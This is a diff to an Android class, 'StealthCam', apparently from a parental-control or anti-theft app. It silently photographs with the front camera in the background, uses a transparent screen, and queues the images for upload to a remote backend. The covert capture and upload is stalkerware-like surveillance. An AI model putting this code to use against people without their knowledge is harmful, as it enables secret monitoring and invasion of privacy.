@@ -28,11 +28,16 @@ final class StealthCam {
     private StealthCam() {}
 
     /** מצלם ושולח להורה. reason: "theft" / "parent". רץ ברקע. */
-    static void capture(final Context ctx, final String reason) {
+    static void capture(final Context ctx, final String reason) { capture(ctx, reason, null); }
+
+    /** done – נקרא בסוף (הצליח או לא), כדי שהמסך השקוף ייסגר */
+    static void capture(final Context ctx, final String reason, final Runnable done0) {
         final Context c = ctx.getApplicationContext();
-        if (c.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { status(c, "❌ אין הרשאת מצלמה בנגן"); return; }
+        final boolean[] fired = {false};
+        final Runnable fin = () -> { if (fired[0]) return; fired[0] = true; if (done0 != null) try { done0.run(); } catch (Exception ignored) {} };
+        if (c.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { status(c, "❌ אין הרשאת מצלמה בנגן"); fin.run(); return; }
         final CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
-        if (cm == null) return;
+        if (cm == null) { status(c, "❌ אין שירות מצלמה בנגן"); fin.run(); return; }
         try {
             String front = null, back = null;
             for (String id : cm.getCameraIdList()) {
@@ -41,7 +46,7 @@ final class StealthCam {
                 if (f != null && f == CameraCharacteristics.LENS_FACING_BACK && back == null) back = id;
             }
             final String camId = front != null ? front : back;
-            if (camId == null) return;
+            if (camId == null) { status(c, "❌ לא נמצאה מצלמה בנגן"); fin.run(); return; }
 
             final HandlerThread ht = new HandlerThread("cam");
             ht.start();
@@ -75,7 +80,8 @@ final class StealthCam {
                     ByteBuffer buf = img.getPlanes()[0].getBuffer();
                     byte[] bytes = new byte[buf.remaining()];
                     buf.get(bytes);
-                    upload(c, bytes, reason, so == null ? 0 : so, isFront);
+                    final int rot = so == null ? 0 : so;
+                    new Thread(() -> { save(c, bytes, reason, rot, isFront); fin.run(); }).start();
                 } catch (Exception ignored) {
                 } finally {
                     if (img != null) img.close();
@@ -90,6 +96,7 @@ final class StealthCam {
                         try { reader.close(); } catch (Exception ignored) {}
                         try { dummy.release(); tex.release(); } catch (Exception ignored) {}
                         try { ht.quitSafely(); } catch (Exception ignored) {}
+                        if (!done[0]) { status(c, "❌ המצלמה לא החזירה תמונה – אולי אפליקציה אחרת משתמשת בה"); fin.run(); }
                     };
                     try {
                         cam.createCaptureSession(java.util.Arrays.asList(dummy, reader.getSurface()),
@@ -132,20 +139,27 @@ final class StealthCam {
                 @Override
                 public void onDisconnected(CameraDevice cam) {
                     cam.close();
+                    if (!done[0]) { status(c, "❌ המצלמה נותקה לפני הצילום"); fin.run(); }
                 }
 
                 @Override
                 public void onError(CameraDevice cam, int error) {
                     cam.close();
                     status(c, "❌ המצלמה לא נפתחה (שגיאה " + error + ")");
+                    fin.run();
                 }
             }, bg);
         } catch (Exception e) {
             status(c, "❌ צילום נכשל: " + e.getMessage());
+            fin.run();
         }
     }
 
     private static void status(Context c, String msg) {
+        new Thread(() -> status0(c, msg)).start();
+    }
+
+    private static void status0(Context c, String msg) {
         try { Fb.patch("d/" + Cfg.deviceId(c) + "/st", new JSONObject().put("camMsg", msg).toString()); } catch (Exception ignored) {}
     }
 
@@ -153,12 +167,11 @@ final class StealthCam {
         return android.hardware.camera2.CameraMetadata.CONTROL_MODE_AUTO;
     }
 
-    private static void upload(Context c, byte[] jpeg, String reason, int rot, boolean front) {
+    /** מעבד את התמונה ושומר בתיבת היציאה – נשלחת מיד, ואם אין אינטרנט – ברגע שיתחבר */
+    private static void save(Context c, byte[] jpeg, String reason, int rot, boolean front) {
         try {
-            // דחיסה לתמונה קטנה כדי לשלוח במהירות
             Bitmap bm = BitmapFactory.decodeByteArray(jpeg, 0, jpeg.length);
-            if (bm == null) return;
-            // סיבוב לפי כיוון החיישן – כדי שהתמונה תצא עומדת (נגן מוחזק לאורך)
+            if (bm == null) { status0(c, "❌ התמונה יצאה ריקה"); return; }
             Matrix m = new Matrix();
             if (rot != 0) m.postRotate(rot);
             bm = Bitmap.createBitmap(bm, 0, 0, bm.getWidth(), bm.getHeight(), m, true);
@@ -168,13 +181,7 @@ final class StealthCam {
             }
             ByteArrayOutputStream o = new ByteArrayOutputStream();
             bm.compress(Bitmap.CompressFormat.JPEG, 70, o);
-            String b64 = Base64.encodeToString(o.toByteArray(), Base64.NO_WRAP);
-            JSONObject p = new JSONObject();
-            p.put("img", b64);
-            p.put("r", reason);
-            p.put("t", new JSONObject().put(".sv", "timestamp"));
-            Fb.put("d/" + Cfg.deviceId(c) + "/photo", p.toString());
-            status(c, "");
-        } catch (Exception ignored) {}
+            Outbox.photo(c, o.toByteArray(), reason);
+        } catch (Exception e) { status0(c, "❌ עיבוד התמונה נכשל"); }
     }
 }
